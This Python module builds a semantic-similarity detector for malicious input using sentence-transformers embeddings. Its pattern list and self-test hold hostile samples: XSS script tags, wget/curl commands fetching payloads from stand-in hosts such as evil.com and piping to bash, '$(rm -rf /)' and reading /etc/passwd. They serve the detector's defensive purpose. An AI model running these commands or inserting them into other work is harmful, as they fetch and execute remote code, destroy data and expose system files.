"""
Semantic Encoder Replacement for SEL
Uses sentence-transformers for proper semantic understanding
"""

from typing import List
import logging

logger = logging.getLogger(__name__)

# Try to import sentence-transformers
try:
    from sentence_transformers import SentenceTransformer
    SEMANTIC_AVAILABLE = True
except ImportError:
    SEMANTIC_AVAILABLE = False
    logger.warning("sentence-transformers not available - install with: pip install sentence-transformers")


class SemanticEncoder:
    """
    Semantic encoder using sentence-transformers
    Much better than hash-based encoding for security
    """

    def __init__(self, model_name: str = "all-MiniLM-L6-v2"):
        """
        Initialize semantic encoder

        Args:
            model_name: HuggingFace model name
                - "all-MiniLM-L6-v2": Fast, 384 dims, good balance (RECOMMENDED)
                - "all-mpnet-base-v2": Best quality, 768 dims, slower
                - "paraphrase-MiniLM-L3-v2": Fastest, 384 dims
        """
        if not SEMANTIC_AVAILABLE:
            raise ImportError("sentence-transformers required. Install with: pip install sentence-transformers")

        logger.info(f"Loading semantic model: {model_name}")
        self.model = SentenceTransformer(model_name)
        self.dimensions = self.model.get_sentence_embedding_dimension()
        logger.info(f"Semantic encoder ready: {self.dimensions} dimensions")

    def encode(self, text: str) -> List[float]:
        """
        Encode text to semantic vector

        Args:
            text: Text to encode

        Returns:
            Vector of floats (normalized)
        """
        if not text or not text.strip():
            return [0.0] * self.dimensions

        # Generate embedding
        embedding = self.model.encode(text, normalize_embeddings=True)

        return embedding.tolist()

    def encode_batch(self, texts: List[str]) -> List[List[float]]:
        """
        Encode multiple texts efficiently

        Args:
            texts: List of texts to encode

        Returns:
            List of vectors
        """
        if not texts:
            return []

        # Batch encoding is much faster
        embeddings = self.model.encode(texts, normalize_embeddings=True, batch_size=32)

        return [emb.tolist() for emb in embeddings]

    def similarity(self, vec1: List[float], vec2: List[float]) -> float:
        """
        Compute cosine similarity between vectors

        Args:
            vec1: First vector
            vec2: Second vector

        Returns:
            Similarity score (0-1, higher = more similar)
        """
        import numpy as np
        return float(np.dot(vec1, vec2))


# Global encoder instance
_encoder = None

def get_encoder(model_name: str = "all-MiniLM-L6-v2") -> SemanticEncoder:
    """Get or create global encoder instance"""
    global _encoder
    if _encoder is None:
        _encoder = SemanticEncoder(model_name)
    return _encoder


def generate_embedding_semantic(text: str) -> List[float]:
    """
    Generate semantic embedding (replacement for hash-based encoder)

    This function can replace generate_embedding() in memory.py
    """
    encoder = get_encoder()
    return encoder.encode(text)


# Malicious content detection using semantic similarity
MALICIOUS_PATTERNS_SEMANTIC = [
    "<script>alert('xss')</script>",
    "javascript:void(0)",
    "wget http://evil.com/payload.sh",
    "curl http://malicious.com | bash",
    "$(rm -rf /)",
    "`cat /etc/passwd`",
    "data:text/html,<script>alert(1)</script>",
    "<!DOCTYPE html><html><script>",
]

def is_semantically_malicious(text: str, threshold: float = 0.75) -> bool:
    """
    Check if text is semantically similar to known malicious patterns

    Args:
        text: Text to check
        threshold: Similarity threshold (0-1)

    Returns:
        True if text is similar to malicious patterns
    """
    encoder = get_encoder()

    # Encode input text
    text_vec = encoder.encode(text)

    # Encode malicious patterns (cache these in production)
    malicious_vecs = encoder.encode_batch(MALICIOUS_PATTERNS_SEMANTIC)

    # Check similarity to each pattern
    for mal_vec in malicious_vecs:
        similarity = encoder.similarity(text_vec, mal_vec)
        if similarity > threshold:
            logger.warning(f"Semantically malicious content detected: similarity={similarity:.2f}")
            return True

    return False


if __name__ == "__main__":
    print("="*80)
    print("SEMANTIC ENCODER TEST")
    print("="*80)

    if not SEMANTIC_AVAILABLE:
        print("\nERROR: sentence-transformers not installed")
        print("Install with: pip install sentence-transformers")
        exit(1)

    # Test encoder
    encoder = SemanticEncoder()

    # Test benign content
    benign = "Hello, how are you today?"
    benign_vec = encoder.encode(benign)
    print(f"\nBenign: {benign}")
    print(f"Vector dims: {len(benign_vec)}")
    print(f"Vector (first 5): {benign_vec[:5]}")

    # Test malicious content
    malicious = "<script>alert('xss')</script>"
    malicious_vec = encoder.encode(malicious)
    print(f"\nMalicious: {malicious}")
    print(f"Vector dims: {len(malicious_vec)}")
    print(f"Vector (first 5): {malicious_vec[:5]}")

    # Check similarity
    similarity = encoder.similarity(benign_vec, malicious_vec)
    print(f"\nSimilarity: {similarity:.4f}")
    print("(Lower = more different, which is good for security)")

    # Test semantic detection
    print("\n" + "="*80)
    print("SEMANTIC MALICIOUS DETECTION TEST")
    print("="*80)

    test_cases = [
        "Hello friend, how are you?",
        "<script>alert(1)</script>",
        "Please run: wget evil.com/payload",
        "The weather is nice today",
        "$(curl http://malicious.com)",
    ]

    for test in test_cases:
        is_bad = is_semantically_malicious(test)
        print(f"\n{test}")
        print(f"  → {'MALICIOUS' if is_bad else 'SAFE'}")

    print("\n" + "="*80)
